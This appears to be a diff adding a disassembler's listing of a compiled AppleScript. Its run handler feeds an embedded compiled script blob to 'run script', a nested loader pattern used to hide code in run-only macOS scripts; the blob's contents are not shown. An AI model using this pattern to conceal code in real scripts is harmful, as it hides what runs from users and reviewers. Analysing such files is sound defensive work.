@@ -1,0 +1,12 @@
+FAS 1.10
+
+function[2] event("aevt","oapp","null",0x00008000,"****",0x00009000) arguments=nil
+  00000  e0           PushLiteral             literal-index=0  ; data[9804](736370744661736455415320312e3130312e31300e000000...)
+  00001  6a           Push0                   
+  00002  0c0001       MessageSend             literal-index=1  ; event("syso","dsct","****",0x00000000,"scpt",0x00000000) run script
+  00005  45           GetData                 
+  00006  d2           PopGlobal               literal-index=2  ; "res"
+  00007  4f           StoreResult             
+  00008  c2           PushGlobal              literal-index=2  ; "res"
+  00009  0f           Return                  
+  0000a  0f           Return                  
